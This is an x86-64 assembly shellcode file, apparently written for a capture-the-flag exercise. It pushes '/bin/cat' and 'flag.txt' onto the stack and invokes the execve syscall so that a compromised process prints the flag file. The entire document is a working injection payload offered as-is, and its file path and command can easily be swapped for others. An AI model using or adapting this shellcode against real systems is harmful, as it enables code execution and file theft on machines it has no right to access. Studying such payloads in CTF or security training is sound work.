; execve("/bin/cat", ["/bin/cat", "flag.txt"], NULL)
BITS 64
    section .text
            global shellcode

    shellcode:
            xor rdx, rdx
            push rdx
            mov qword rbx, 'flag.txt'
            push rbx
            mov r13, rsp
            push rdx
            mov qword rbx, '/bin/cat'
            push rbx
            mov rdi, rsp
            push rdx
            push r13
            ; sycall execve, rdx is initially zero
            push rdi
            mov rsi, rsp
            xor rax, rax
            mov al, 59
            syscall
